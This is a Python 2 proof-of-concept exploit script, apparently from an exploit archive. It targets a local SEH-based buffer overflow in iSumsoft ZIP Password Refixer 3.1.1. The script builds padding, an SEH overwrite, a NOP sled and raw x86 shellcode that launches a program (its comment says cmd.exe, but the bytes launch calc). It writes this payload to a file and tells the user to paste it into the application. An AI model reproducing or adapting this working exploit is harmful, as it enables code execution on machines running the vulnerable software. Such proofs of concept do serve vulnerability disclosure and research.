author = '''
   
                ##############################################
                #    Created: ScrR1pTK1dd13                  #
                #    Name: Greg Priest                       #
                #    Mail: ScR1pTK1dd13.slammer@gmail.com    # 
                ##############################################
   
# Exploit Title:iSumsoft Local Buffer Overflow Vuln. 0day(SEH)
# Date: 2018.03.02
# Exploit Author: Greg Priest
# Version: iSumsoft ZIP Password Refixer Version 3.1.1
# Tested on: Windows7 x64 HUN/ENG Professional
'''

junk = "A" * 340
nSEH = "\xeb\x06\x90\x90"
SEH = "\x0C\x70\x8D\x73"
nop = "\x90" *16

shellcode =(
"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f" + #cmd.exe shellcode! 
"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b" +
"\x77\x20\x8b\x3f\x80\x7e\x0c\x33" +
"\x75\xf2\x89\xc7\x03\x78\x3c\x8b" +
"\x57\x78\x01\xc2\x8b\x7a\x20\x01" +
"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6" +
"\x45\x81\x3e\x43\x72\x65\x61\x75" +
"\xf2\x81\x7e\x08\x6f\x63\x65\x73" +
"\x75\xe9\x8b\x7a\x24\x01\xc7\x66" +
"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7" +
"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9" +
"\xb1\xff\x53\xe2\xfd\x68\x63\x61" +
"\x6c\x63\x89\xe2\x52\x52\x53\x53" +
"\x53\x53\x53\x53\x52\x53\xff\xd7")

crash = junk + nSEH + SEH + nop + shellcode + "C" * 300

exploit = open('iSumsoft-exploit.txt', 'w')
exploit.write(crash)
exploit.close()

print author
print '''
        #####################
        #This is a PoC code!#   
        #####################

'''
print "[+] iSumsoft-exploit.txt ready!"
print '[+] Copy iSumsoft-exploit.txt string and paste "start from:" field!'